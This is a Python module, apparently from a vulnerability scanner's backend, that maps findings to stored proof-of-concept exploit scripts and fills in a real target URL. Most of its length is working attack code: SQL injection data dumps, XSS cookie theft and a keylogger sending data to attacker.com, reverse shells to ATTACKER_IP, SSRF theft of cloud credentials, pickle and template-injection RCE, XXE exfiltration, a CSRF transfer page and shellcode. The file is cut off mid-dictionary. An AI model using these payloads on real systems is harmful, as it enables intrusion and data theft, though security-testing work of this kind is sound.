from typing import List, Optional, Literal, Dict, Any
import re

from sqlalchemy.orm import Session

from backend import models
from backend.core.config import settings
from backend.core.logging import get_logger

logger = get_logger(__name__)

# Exploit analysis mode settings
FULL_ANALYSIS_THRESHOLD = 15  # Use full analysis if <= this many high/critical findings
MAX_FINDINGS_FOR_LLM = 5  # Max individual LLM calls in full mode
MAX_CODE_SNIPPET_LENGTH = 2000  # Truncate code snippets
MAX_PROMPT_LENGTH = 4000  # Total prompt size limit

# Analysis modes
AnalysisMode = Literal["full", "summary", "auto"]


# ==============================================================================
# POC EXPLOIT SCRIPTS - Executable proof-of-concept code for each vulnerability
# ==============================================================================

POC_SCRIPTS: Dict[str, Dict[str, str]] = {
    # === CODE INJECTION ===
    "eval": {
        "python": '''#!/usr/bin/env python3
"""POC: Code Injection via eval()"""
import requests

TARGET_URL = "http://target.com/vulnerable_endpoint"
PAYLOAD = "__import__('os').system('id')"

# Test basic code execution
response = requests.post(TARGET_URL, data={"input": PAYLOAD})
print(f"Response: {response.text}")

# Alternative payloads
payloads = [
    "__import__('os').popen('whoami').read()",
    "__import__('subprocess').check_output(['id'])",
    "(lambda: __import__('os').system('cat /etc/passwd'))()",
    "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))",
]

for p in payloads:
    print(f"\\nTrying: {p[:50]}...")
    r = requests.post(TARGET_URL, data={"input": p})
    if "uid=" in r.text or "root" in r.text:
        print(f"[+] SUCCESS: {p}")
''',
        "curl": '''#!/bin/bash
# POC: Code Injection via eval()
TARGET="http://target.com/vulnerable_endpoint"

# Basic code execution
curl -X POST "$TARGET" -d "input=__import__('os').system('id')"

# Read /etc/passwd
curl -X POST "$TARGET" -d "input=__import__('os').popen('cat /etc/passwd').read()"

# Reverse shell (change IP/PORT)
# curl -X POST "$TARGET" -d "input=__import__('os').system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
''',
    },
    "exec": {
        "python": '''#!/usr/bin/env python3
"""POC: Command Injection via exec()/subprocess"""
import requests

TARGET_URL = "http://target.com/api/run"
CMD_PARAM = "command"  # Adjust parameter name

# Test command injection
payloads = [
    "; id",
    "| id",
    "& id &",
    "`id`",
    "$(id)",
    "\\n id",
    "|| id",
    "&& id",
]

for payload in payloads:
    response = requests.post(TARGET_URL, data={CMD_PARAM: f"ls {payload}"})
    if "uid=" in response.text:
        print(f"[+] Vulnerable! Payload: {payload}")
        print(response.text)
        break

# If successful, try to get reverse shell
# payload = "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
''',
        "curl": '''#!/bin/bash
# POC: Command Injection
TARGET="http://target.com/api/run"

# Test various injection techniques
curl -X POST "$TARGET" -d "command=ls; id"
curl -X POST "$TARGET" -d "command=ls | id"
curl -X POST "$TARGET" -d 'command=ls `id`'
curl -X POST "$TARGET" -d 'command=ls $(id)'

# Get reverse shell (update ATTACKER_IP/PORT)
# curl -X POST "$TARGET" -d "command=;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
''',
    },
    "shell=true": {
        "python": '''#!/usr/bin/env python3
"""POC: Shell Injection (subprocess with shell=True)"""
import requests
import urllib.parse

TARGET_URL = "http://target.com/api/exec"

# Shell metacharacter injection payloads
payloads = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd &",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; curl http://attacker.com/?data=$(whoami)",  # Exfiltration
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    r = requests.get(f"{TARGET_URL}?cmd=test{encoded}")
    if "root:" in r.text:
        print(f"[+] SUCCESS: {payload}")
        print(r.text[:500])
''',
    },
    
    # === SQL INJECTION ===
    "sql": {
        "python": '''#!/usr/bin/env python3
"""POC: SQL Injection"""
import requests

TARGET_URL = "http://target.com/api/search"
PARAM = "query"

# Detection payloads
detection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",  # Find column count
    "' UNION SELECT NULL--",
]

# Test for vulnerability
for payload in detection_payloads:
    r = requests.get(TARGET_URL, params={PARAM: payload})
    if "error" not in r.text.lower() and len(r.text) > 100:
        print(f"[+] Potential SQLi: {payload}")

# UNION-based extraction (adjust columns)
union_payload = "' UNION SELECT username,password,NULL FROM users--"
r = requests.get(TARGET_URL, params={PARAM: union_payload})
print(f"UNION result: {r.text[:500]}")

# Boolean-based blind
blind_true = "' AND '1'='1"
blind_false = "' AND '1'='2"
r_true = requests.get(TARGET_URL, params={PARAM: f"test{blind_true}"})
r_false = requests.get(TARGET_URL, params={PARAM: f"test{blind_false}"})
if len(r_true.text) != len(r_false.text):
    print("[+] Boolean blind SQLi confirmed!")
''',
        "curl": '''#!/bin/bash
# POC: SQL Injection
TARGET="http://target.com/api/search"

# Test authentication bypass
curl "$TARGET?query=' OR '1'='1' --"

# UNION-based extraction
curl "$TARGET?query=' UNION SELECT username,password FROM users--"

# Time-based blind (if above fails)
curl "$TARGET?query='; WAITFOR DELAY '0:0:5'--"  # MSSQL
curl "$TARGET?query='; SELECT SLEEP(5)--"        # MySQL
''',
        "sqlmap": '''#!/bin/bash
# SQLMap automated exploitation
sqlmap -u "http://target.com/api/search?query=test" --batch --dbs
sqlmap -u "http://target.com/api/search?query=test" --batch -D database_name --tables
sqlmap -u "http://target.com/api/search?query=test" --batch -D database_name -T users --dump
''',
    },
    
    # === XSS ===
    "xss": {
        "javascript": '''// POC: Cross-Site Scripting (XSS)
// Inject via vulnerable parameter

// Basic alert
<script>alert(document.cookie)</script>

// Cookie stealing
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>

// Event handlers (bypass script tags)
<img src=x onerror="alert(document.cookie)">
<svg onload="alert(document.cookie)">
<body onload="alert(document.cookie)">

// DOM-based XSS test
<script>
var payload = document.location.hash.substr(1);
document.write(payload);
</script>

// Keylogger injection
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?k=' + e.key);
}
</script>
''',
        "curl": '''#!/bin/bash
# POC: XSS Testing
TARGET="http://target.com/search"

# Test various XSS payloads
curl "$TARGET?q=<script>alert(1)</script>"
curl "$TARGET?q=<img src=x onerror=alert(1)>"
curl "$TARGET?q=<svg/onload=alert(1)>"

# Encoded payloads
curl "$TARGET?q=%3Cscript%3Ealert(1)%3C/script%3E"
''',
    },
    
    # === PATH TRAVERSAL ===
    "path_traversal": {
        "python": '''#!/usr/bin/env python3
"""POC: Path Traversal / LFI"""
import requests

TARGET_URL = "http://target.com/api/file"
PARAM = "filename"

# Path traversal payloads
payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",  # Double encoding
    "/etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",  # Windows
    "..\\\\..\\\\..\\\\windows\\\\win.ini",
]

for payload in payloads:
    r = requests.get(TARGET_URL, params={PARAM: payload})
    if "root:" in r.text or "[fonts]" in r.text:
        print(f"[+] SUCCESS: {payload}")
        print(r.text[:500])
        break

# PHP wrapper for LFI to RCE
php_payloads = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",  # POST body as code
    "data://text/plain,<?php system('id')?>",
]
''',
        "curl": '''#!/bin/bash
# POC: Path Traversal
TARGET="http://target.com/api/file"

# Linux targets
curl "$TARGET?filename=../../../etc/passwd"
curl "$TARGET?filename=....//....//....//etc/passwd"

# Windows targets
curl "$TARGET?filename=..\\\\..\\\\..\\\\windows\\\\win.ini"

# URL encoded
curl "$TARGET?filename=..%2f..%2f..%2fetc/passwd"
''',
    },
    
    # === SSRF ===
    "ssrf": {
        "python": '''#!/usr/bin/env python3
"""POC: Server-Side Request Forgery (SSRF)"""
import requests

TARGET_URL = "http://target.com/api/fetch"
URL_PARAM = "url"

# SSRF payloads
payloads = [
    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/metadata/v1/",       # DigitalOcean
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    
    # Internal network scanning
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    
    # Protocol smuggling
    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",  # Redis
    "dict://localhost:11211/stat",  # Memcached
]

for payload in payloads:
    try:
        r = requests.post(TARGET_URL, data={URL_PARAM: payload}, timeout=5)
        print(f"[*] {payload[:50]}: {len(r.text)} bytes")
        if "ami-" in r.text or "iam" in r.text.lower():
            print(f"[+] AWS Metadata exposed!")
            print(r.text[:500])
    except:
        pass
''',
        "curl": '''#!/bin/bash
# POC: SSRF
TARGET="http://target.com/api/fetch"

# AWS metadata
curl -X POST "$TARGET" -d "url=http://169.254.169.254/latest/meta-data/"
curl -X POST "$TARGET" -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Internal services
curl -X POST "$TARGET" -d "url=http://localhost:8080/admin"
curl -X POST "$TARGET" -d "url=http://127.0.0.1:6379"  # Redis
''',
    },
    
    # === DESERIALIZATION ===
    "deserialization": {
        "python": '''#!/usr/bin/env python3
"""POC: Insecure Deserialization (Python pickle)"""
import pickle
import base64
import os
import requests

# Malicious pickle payload generator
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

# Generate payload
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# Send to target
TARGET_URL = "http://target.com/api/load"
r = requests.post(TARGET_URL, data={"data": payload})
print(r.text)

# Alternative: YAML deserialization
yaml_payload = """
!!python/object/apply:os.system
args: ['id']
"""
''',
        "java": '''// POC: Java Deserialization
// Use ysoserial to generate payloads:
// java -jar ysoserial.jar CommonsCollections6 "id" | base64

// Common gadget chains:
// CommonsCollections1-7
// Groovy1
// Spring1-2
// JBossInterceptors1

// Example HTTP request with serialized payload
// POST /api/deserialize HTTP/1.1
// Content-Type: application/x-java-serialized-object
// 
// [base64 encoded ysoserial payload]
''',
    },
    
    # === XXE ===
    "xxe": {
        "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!-- POC: XML External Entity (XXE) Injection -->

<!-- Basic file read -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE with external DTD -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- evil.dtd content:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfiltrate;
-->
''',
        "python": '''#!/usr/bin/env python3
"""POC: XXE Injection"""
import requests

TARGET_URL = "http://target.com/api/xml"

# Basic XXE payload
xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

headers = {"Content-Type": "application/xml"}
r = requests.post(TARGET_URL, data=xxe_payload, headers=headers)
print(r.text)
''',
    },
    
    # === SECRETS ===
    "secret": {
        "bash": '''#!/bin/bash
# POC: Extracting Hardcoded Secrets

# Search git history for secrets
git log -p | grep -i "password\\|secret\\|api_key\\|token\\|credential"
git log --all --full-history -p -- "**/config*" | grep -i password
git log -p -S "password" --all

# Search current codebase
grep -r "password\\s*=" --include="*.py" --include="*.js" --include="*.java"
grep -r "api_key\\|apikey\\|secret_key" --include="*.py" --include="*.env"
grep -r "AWS_ACCESS_KEY\\|AWS_SECRET" .

# TruffleHog for comprehensive search
trufflehog git file://. --only-verified

# Use found credentials
# curl -H "Authorization: Bearer EXTRACTED_TOKEN" https://api.target.com/admin
''',
        "python": '''#!/usr/bin/env python3
"""POC: Using Extracted Credentials"""
import requests
import os

# Test extracted credentials
API_KEY = "EXTRACTED_API_KEY_HERE"
TARGET_API = "https://api.target.com"

# Try the key
headers = {"Authorization": f"Bearer {API_KEY}"}
r = requests.get(f"{TARGET_API}/admin/users", headers=headers)
print(f"Status: {r.status_code}")
print(r.text[:500])

# For AWS keys
# import boto3
# session = boto3.Session(
#     aws_access_key_id='AKIAIOSFODNN7EXAMPLE',
#     aws_secret_access_key='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
# )
# s3 = session.client('s3')
# print(s3.list_buckets())
''',
    },
    
    # === JWT ===
    "jwt": {
        "python": '''#!/usr/bin/env python3
"""POC: JWT Vulnerabilities"""
import jwt
import base64
import json
import requests

TARGET_URL = "http://target.com/api/admin"
ORIGINAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 1. Algorithm=None attack
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{header_b64}.{payload_b64}."
print(f"None algo token: {forged_token}")

# 2. Weak secret brute force
common_secrets = ["secret", "password", "123456", "key", "private"]
for secret in common_secrets:
    try:
        decoded = jwt.decode(ORIGINAL_TOKEN, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        # Forge new token
        forged = jwt.encode({"user": "admin", "role": "admin"}, secret, algorithm="HS256")
        print(f"Forged token: {forged}")
        break
    except:
        pass

# 3. RS256 to HS256 confusion (if public key available)
# public_key = open("public.pem").read()
# forged = jwt.encode(payload, public_key, algorithm="HS256")
''',
    },
    
    # === CSRF ===
    "csrf": {
        "html": '''<!DOCTYPE html>
<!-- POC: CSRF Attack -->
<html>
<head><title>Win a Prize!</title></head>
<body>
<h1>Click here to claim your prize!</h1>

<!-- Auto-submit form -->
<form id="csrf-form" action="http://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>

<script>
    document.getElementById('csrf-form').submit();
</script>

<!-- Or use image tag for GET -->
<img src="http://target.com/api/delete?id=123" style="display:none">

<!-- JSON CSRF with fetch -->
<script>
fetch('http://target.com/api/settings', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
</body>
</html>
''',
    },
    
    # === PROTOTYPE POLLUTION ===
    "prototype": {
        "javascript": '''// POC: Prototype Pollution
// Test in browser console or via HTTP request

// Basic pollution
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
console.log({}.isAdmin); // Should be true if vulnerable

// Via constructor
const obj = {};
obj.constructor.prototype.polluted = true;
console.log({}.polluted); // true

// HTTP payload examples
// POST /api/merge
// {"__proto__":{"isAdmin":true}}

// Or via query string
// GET /api/config?__proto__[isAdmin]=true

// Exploitation for RCE (Node.js child_process)
// {"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
''',
        "python": '''#!/usr/bin/env python3
"""POC: Prototype Pollution via HTTP"""
import requests
import json

TARGET_URL = "http://target.com/api/merge"

# Test payloads
payloads = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
]

for payload in payloads:
    r = requests.post(TARGET_URL, json=payload)
    print(f"Payload: {json.dumps(payload)}")
    print(f"Response: {r.text[:200]}")
''',
    },
    
    # === BUFFER OVERFLOW ===
    "buffer": {
        "python": '''#!/usr/bin/env python3
"""POC: Buffer Overflow Testing"""
import socket
import struct

TARGET_HOST = "target.com"
TARGET_PORT = 9999

# Generate cyclic pattern for offset finding
def cyclic(length):
    """Generate a cyclic pattern to find offset"""
    pattern = ""
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(length):
        pattern += chars[i % len(chars)]
    return pattern

# Basic overflow test
def test_overflow():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    
    # Send increasing buffer sizes
    for size in [100, 500, 1000, 2000, 5000]:
        payload = b"A" * size
        try:
            s.send(payload)
            response = s.recv(1024)
            print(f"[*] Size {size}: Response received")
        except:
            print(f"[!] Size {size}: Crash detected!")
            break

# After finding offset, craft exploit
# payload = b"A" * offset + struct.pack("<I", return_address) + shellcode
''',
        "c": '''/* POC: Buffer Overflow Shellcode Generator */
// Compile: gcc -fno-stack-protector -z execstack poc.c -o poc

#include <stdio.h>
#include <string.h>

// Linux x86 execve /bin/sh shellcode
unsigned char shellcode[] = 
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
    "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";

int main() {
    printf("Shellcode length: %lu\\n", strlen(shellcode));
    
    // Test shellcode
    void (*func)() = (void(*)())shellcode;
    func();
    
    return 0;
}
''',
    },
    
    # === TEMPLATE INJECTION ===
    "template": {
        "python": '''#!/usr/bin/env python3
"""POC: Server-Side Template Injection (SSTI)"""
import requests

TARGET_URL = "http://target.com/render"
PARAM = "template"

# Detection payloads for various engines
detection = {
    "Jinja2/Twig": "{{7*7}}",
    "Jinja2": "{{config}}",
    "Freemarker": "${7*7}",
    "Velocity": "#set($x=7*7)${x}",
    "Smarty": "{php}echo 7*7;{/php}",
    "Pebble": "{{7*7}}",
}

for engine, payload in detection.items():
    r = requests.get(TARGET_URL, params={PARAM: payload})
    if "49" in r.text:
        print(f"[+] {engine} detected!")

# Jinja2 RCE payloads
jinja2_rce = [
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
]

for payload in jinja2_rce:
    r = requests.get(TARGET_URL, params={PARAM: payload})
    if "uid=" in r.text:
        print(f"[+] RCE achieved: {payload}")
''',
    },
    
    # === WEAK CRYPTO ===
    "md5": {
        "python": '''#!/usr/bin/env python3
"""POC: Cracking MD5 Hashes"""
import hashlib
import requests

# If you captured an MD5 hash
TARGET_HASH = "5f4dcc3b5aa765d61d8327deb882cf99"  # "password"

# Try common passwords
wordlist = ["password", "123456", "admin", "letmein", "welcome"]
for word in wordlist:
    if hashlib.md5(word.encode()).hexdigest() == TARGET_HASH:
        print(f"[+] Cracked: {word}")
        break

# Or use hashcat
# hashcat -m 0 hash.txt wordlist.txt

# Or rainbow tables
# https://crackstation.net/
''',
        "bash": '''#!/bin/bash
# POC: MD5 Hash Cracking

# Using hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Online rainbow tables
echo "Paste hash at https://crackstation.net/"
''',
    },
    
    "rand": {
        "python": '''#!/usr/bin/env python3
"""POC: Predicting Weak Random Numbers"""
import random
import time

# If you know the seed or can brute-force it
# Capture several sequential values, then predict next

known_values = [12, 45, 78]  # Values you captured
seed_start = int(time.time()) - 86400  # Start from yesterday

for seed in range(seed_start, int(time.time())):
    random.seed(seed)
    test = [random.randint(0, 100) for _ in range(3)]
    if test == known_values:
        print(f"[+] Seed found: {seed}")
        print(f"[+] Next value: {random.randint(0, 100)}")
        break

# For Math.random() in JS, similar approach with V8 internals
''',
    },
}


def generate_poc_script(
    vuln_type: str, 
    target_url: str = None,
    file_path: str = None,
    language: str = "python"
) -> Dict[str, str]:
    """
    Generate proof-of-concept exploit scripts for a vulnerability type.
    
    Args:
        vuln_type: The vulnerability type key (e.g., 'sql', 'xss', 'eval')
        target_url: Optional target URL to customize the POC
        file_path: Optional file path where vulnerability was found
        language: Preferred script language ('python', 'bash', 'curl', etc.)
        
    Returns:
        Dictionary with script type -> script content
    """
    scripts = POC_SCRIPTS.get(vuln_type, {})
    
    if not scripts:
        # Try to find a similar category
        for key in POC_SCRIPTS:
            if key in vuln_type or vuln_type in key:
                scripts = POC_SCRIPTS[key]
                break
    
    if not scripts:
        return {"note": f"No POC scripts available for '{vuln_type}'. Manual exploitation required."}
    
    # Customize scripts with target URL if provided
    if target_url:
        customized = {}
        for lang, script in scripts.items():
            script = script.replace("http://target.com", target_url)
            script = script.replace("https://target.com", target_url)
            customized[lang] = script
        scripts = customized
    
    # Add file context as comment
    if file_path:
        context_comment = f"\n# Vulnerable file: {file_path}\n"
        customized = {}
        for lang, script in scripts.items():
            if lang == "python":
                customized[lang] = script.replace('"""', f'"""\nVulnerable file: {file_path}', 1)
            elif lang in ("bash", "curl"):
                customized[lang] = f"# Vulnerable file: {file_path}\n{script}"
            else:
                customized[lang] = script
        scripts = customized
    
    return scripts


def get_poc_scripts_for_finding(finding: models.Finding) -> Dict[str, str]:
    """
    Get appropriate POC scripts for a finding based on its type and details.
    
    Args:
        finding: The finding model
        
    Returns:
        Dictionary of POC scripts
    """
    # Get template key for the finding
    template_key = _get_template_key_for_finding(finding) if finding else None
    
    if not template_key:
        # Try to infer from summary
        summary_lower = finding.summary.lower() if finding else ""
        type_map = {
            "sql": ["sql", "query", "injection"],
            "xss": ["xss", "script", "cross-site"],
            "eval": ["eval", "code injection"],
            "exec": ["command", "exec", "shell", "system"],
            "path_traversal": ["path", "traversal", "directory"],
            "ssrf": ["ssrf", "request forgery"],
            "xxe": ["xxe", "xml", "entity"],
            "deserialization": ["pickle", "deserialize", "yaml"],
            "secret": ["secret", "password", "credential", "api_key"],
            "jwt": ["jwt", "token"],
            "csrf": ["csrf", "cross-site request"],
            "buffer": ["buffer", "overflow"],
            "template": ["template", "ssti", "jinja"],
            "md5": ["md5", "weak hash"],
            "rand": ["random", "rand"],
            "prototype": ["prototype", "__proto__"],
        }
        
        for key, keywords in type_map.items():
            for kw in keywords:
                if kw in summary_lower:
                    template_key = key
                    break
            if template_key:
                break
    
    if template_key:
        return generate_poc_script(
            template_key,
            file_path=finding.file_path if finding else None
        )
    
    return {"note": "Manual analysis required. No automated POC available for this finding type."}


def _get_poc_scripts_for_category(category_key: str, file_path: Optional[str] = None) -> Dict[str, str]:
    """
    Get POC scripts for a vulnerability category.
    Maps category groups to their corresponding POC scripts.
    """
    # Map category groups to POC script keys
    category_to_poc_key = {
        "code_injection": "exec",  # exec covers eval, shell too
        "secrets": "secret",
        "injection_db": "sql",
        "client_side": "xss",
        "network": "ssrf",
        "file_ops": "path_traversal",
        "crypto": "md5",
        "deserial": "deserialization",
        "xml": "xxe",
        "memory": "buffer",
        "auth": "jwt",
        "dos": "rand",  # No specific POC for DoS
        "info_leak": "secret",  # Reuse secret extraction POC
        "java": "deserialization",  # Java exploits often involve deserialization
    }
    
    # Direct key lookup first
    if category_key in POC_SCRIPTS:
        return generate_poc_script(category_key, file_path=file_path)
    
    # Try mapped category
    poc_key = category_to_poc_key.get(category_key)
    if poc_key:
        return generate_poc_script(poc_key, file_path=file_path)
    
    # For individual template keys, try direct lookup
    for key in POC_SCRIPTS:
        if key in category_key or category_key in key:
            return generate_poc_script(key, file_path=file_path)
    
    return {}


def _assess_attack_complexity(category_key: str, findings: List[models.Finding]) -> str:
    """
    Assess the attack complexity based on vulnerability type and context.
    
    Returns:
        "Low", "Medium", or "High"
    """
    # Low complexity - direct exploitation possible
    low_complexity = {
        "sql", "xss", "eval", "exec", "shell=true", "path_traversal",
        "code_injection", "injection_db", "client_side", "secret", "secrets",
        "password", "ssrf", "xxe", "xml", "template",
    }
    
    # High complexity - requires specific conditions or chaining
    high_complexity = {
        "buffer", "use_after_free", "double_free", "race_condition",
        "memory", "integer_overflow", "format", "deserialization", "deserial",
        "prototype",
    }
    
    # Check if vulnerability is directly exploitable based on finding details
    has_user_input = False
    has_network_access = False
    
    for f in findings[:5]:  # Check first 5 findings
        summary_lower = f.summary.lower() if f.summary else ""
        if "user" in summary_lower or "input" in summary_lower or "request" in summary_lower:
            has_user_input = True
        if "http" in summary_lower or "network" in summary_lower or "remote" in summary_lower:
            has_network_access = True
    
    # Direct matches
    if category_key in low_complexity:
        return "Low"
    if category_key in high_complexity:
        return "High"
    
    # Contextual assessment
    if has_user_input and has_network_access:
        return "Low"
    elif has_user_input or has_network_access:
        return "Medium"
    
    return "Medium"


def _get_exploit_maturity(category_key: str) -> str:
    """
    Get the exploit maturity level for a vulnerability category.
    
    Returns:
        "Proof of Concept", "Functional", or "High"
    """
    # High maturity - well-known exploits, tools available
    high_maturity = {
        "sql", "xss", "eval", "exec", "shell=true", "path_traversal",
        "code_injection", "injection_db", "secret", "secrets", "password",
        "md5", "sha1", "deserialization", "deserial", "xxe", "xml",
    }
    
    # Functional - working exploits exist but may need customization
    functional_maturity = {
        "ssrf", "csrf", "jwt", "template", "client_side", "network",
        "file_ops", "prototype", "auth",
    }
    
    # POC only - requires significant research
    poc_maturity = {
        "buffer", "use_after_free", "double_free", "race_condition",
        "memory", "integer_overflow", "format", "rand", "crypto", "dos",
    }
    
    if category_key in high_maturity:
        return "High"
    if category_key in functional_maturity:
        return "Functional"
    if category_key in poc_maturity:
        return "Proof of Concept"
    
    return "Proof of Concept"


# Pre-built exploit templates for common vulnerabilities (no LLM needed)
EXPLOIT_TEMPLATES = {
    "eval": {
        "title": "Code Injection via eval()",
        "narrative": "The use of eval() with untrusted input allows arbitrary code execution. An attacker can inject malicious Python/JavaScript code through user-controlled input that reaches this eval() call.",
        "preconditions": "Attacker must be able to control input that flows into eval()",
        "impact": "Full code execution in the application context, potential RCE",
        "poc_outline": "1. Identify user input reaching eval()\n2. Inject payload: __import__('os').system('id')\n3. Verify command execution",
        "mitigation": "Remove eval() entirely. Use ast.literal_eval() for safe parsing, or implement a whitelist-based parser.",
    },
    "exec": {
        "title": "Code Injection via exec()",
        "narrative": "Similar to eval(), exec() executes arbitrary code. Any user-controlled data reaching exec() enables full code injection.",
        "preconditions": "User input must flow to exec() parameter",
        "impact": "Arbitrary code execution, potential server compromise",
        "poc_outline": "1. Trace data flow to exec()\n2. Inject: exec('import os; os.system(\"whoami\")')\n3. Confirm execution",
        "mitigation": "Eliminate exec() usage. Use safe alternatives like predefined functions or sandboxed execution.",
    },
    "shell=true": {
        "title": "Command Injection via shell=True",
        "narrative": "Using shell=True in subprocess calls enables shell metacharacter injection. Attackers can append commands using ; | & or other shell operators.",
        "preconditions": "User input concatenated into shell command string",
        "impact": "OS command execution, lateral movement, data exfiltration",
        "poc_outline": "1. Find user input in command string\n2. Inject: '; cat /etc/passwd'\n3. Verify command chaining works",
        "mitigation": "Use shell=False with argument list. Validate and sanitize all inputs. Consider shlex.quote().",
    },
    "sql": {
        "title": "SQL Injection Vulnerability",
        "narrative": "Direct string concatenation in SQL queries allows attackers to manipulate query logic, extract data, or modify the database.",
        "preconditions": "User input directly embedded in SQL string",
        "impact": "Data breach, authentication bypass, data manipulation, potential RCE via xp_cmdshell",
        "poc_outline": "1. Test input with single quote: '\n2. Try UNION SELECT: ' UNION SELECT username,password FROM users--\n3. Extract sensitive data",
        "mitigation": "Use parameterized queries or ORM. Never concatenate user input into SQL strings.",
    },
    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "narrative": "Unsanitized user input rendered in HTML enables script injection. Attackers can steal session cookies, perform actions as the user, or redirect to phishing sites.",
        "preconditions": "User input reflected in page without encoding",
        "impact": "Session hijacking, credential theft, malware distribution",
        "poc_outline": "1. Inject: <script>alert(document.cookie)</script>\n2. Or: <img src=x onerror=alert(1)>\n3. Verify script execution",
        "mitigation": "HTML-encode all output. Use Content-Security-Policy headers. Implement input validation.",
    },
    "secret": {
        "title": "Hardcoded Secret Exposure",
        "narrative": "Credentials or API keys committed to source code can be extracted by anyone with repository access, including via leaked git history.",
        "preconditions": "Access to source code or git history",
        "impact": "Unauthorized access to external services, data breach, financial loss",
        "poc_outline": "1. Search git history: git log -p | grep -i password\n2. Use extracted credentials\n3. Access protected resources",
        "mitigation": "Remove secrets from code. Use environment variables or secret management (Vault, AWS Secrets Manager). Rotate compromised credentials immediately.",
    },
    "path_traversal": {
        "title": "Path Traversal / Directory Traversal",
        "narrative": "User-controlled file paths without validation allow reading or writing arbitrary files using ../ sequences.",
        "preconditions": "User input used in file path operations",
        "impact": "Read sensitive files (/etc/passwd, config files), potential RCE via file upload",
        "poc_outline": "1. Request: ?file=../../../etc/passwd\n2. Check for file contents in response\n3. Escalate to write if possible",
        "mitigation": "Validate paths against whitelist. Use os.path.basename() and resolve canonical paths. Implement chroot or sandboxing.",
    },
    "password": {
        "title": "Hardcoded Password Detected",
        "narrative": "Passwords embedded in source code can be extracted by anyone with access to the codebase, including from git history even after removal.",
        "preconditions": "Access to source code repository",
        "impact": "Unauthorized access to systems/accounts, privilege escalation, data breach",
        "poc_outline": "1. Extract password from source\n2. Identify associated service/account\n3. Attempt authentication",
        "mitigation": "Use environment variables or secret management. Rotate all exposed credentials immediately.",
    },
    "rand": {
        "title": "Weak Random Number Generation",
        "narrative": "Use of predictable random functions (rand, Math.random, etc.) for security purposes allows attackers to predict tokens, session IDs, or cryptographic values.",
        "preconditions": "Application uses weak RNG for security-sensitive operations",
        "impact": "Session prediction, token forgery, cryptographic weakness",
        "poc_outline": "1. Analyze RNG usage context\n2. Predict or brute-force generated values\n3. Exploit predictable tokens",
        "mitigation": "Use cryptographically secure RNG: secrets module (Python), crypto.randomBytes (Node.js), SecureRandom (Java).",
    },
    "md5": {
        "title": "Weak Cryptographic Hash (MD5)",
        "narrative": "MD5 is cryptographically broken and unsuitable for security purposes. Collisions can be generated and rainbow tables exist for common passwords.",
